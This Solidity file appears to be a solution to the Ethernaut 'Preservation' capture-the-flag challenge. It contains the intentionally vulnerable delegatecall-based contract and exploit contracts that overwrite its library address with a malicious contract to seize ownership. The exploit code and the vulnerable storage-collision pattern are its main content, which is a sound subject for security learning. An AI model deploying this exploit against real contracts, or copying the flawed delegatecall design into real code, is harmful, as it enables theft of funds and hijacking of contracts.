// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time 
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract ethernautPreservation {
    //0xe92f1553AC4dD20DCA7f96FA2B2d5Ec1F6CfF443 
    //0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5 timezone1
    //0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1 timezone2
    uint256 public ownerAsMeContract = uint256(address(0xD804dB7140C7BD0459B9127444BF22d3800fA04A));
    function solve() public {
        //owner storage is at keccak(3);
        Preservation(address(0xe92f1553AC4dD20DCA7f96FA2B2d5Ec1F6CfF443)).setFirstTime(ownerAsMeContract);
        //Preservation(address(0xe92f1553AC4dD20DCA7f96FA2B2d5Ec1F6CfF443)).setFirstTime(0);
    }
}

contract solver {
    function solve() public {
        Preservation(address(0xe92f1553AC4dD20DCA7f96FA2B2d5Ec1F6CfF443)).setFirstTime(0);
    }
}

contract ownerAsMe {
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setTime(uint aux) public {
        owner = tx.origin;
    }
}
